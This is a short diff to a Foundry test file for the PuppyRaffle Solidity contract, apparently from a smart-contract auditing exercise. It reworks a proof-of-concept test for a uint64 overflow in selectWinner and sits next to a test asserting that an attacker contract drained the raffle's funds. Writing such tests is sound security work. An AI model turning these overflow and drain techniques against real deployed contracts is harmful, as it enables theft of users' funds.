@@ -275,9 +275,15 @@ contract PuppyRaffleTest is Test {
         assertEq(endingAttackerContractBalance, startingAttackerContractBalance + startingContractBalance + entranceFee);
     }
 
-    function test_SelectWinnerOverflow() public {
+    function test_SelectWinnerOverflow() public playersEntered {
+        // calling the first time selectWinner
+        vm.warp(block.timestamp + puppyRaffle.raffleStartTime() + puppyRaffle.raffleDuration());
+        vm.roll(block.number + 1);
+        vm.prank(playerOne);
+        puppyRaffle.selectWinner();
+
         // players needed for the uint64 overflow
-        uint256 numPlayersToOverflow = 93;
+        uint256 numPlayersToOverflow = 89;
         address[] memory players = new address[](numPlayersToOverflow);
         for (uint256 i = 0; i < players.length; i++) {
             players[i] = address(i + 1);
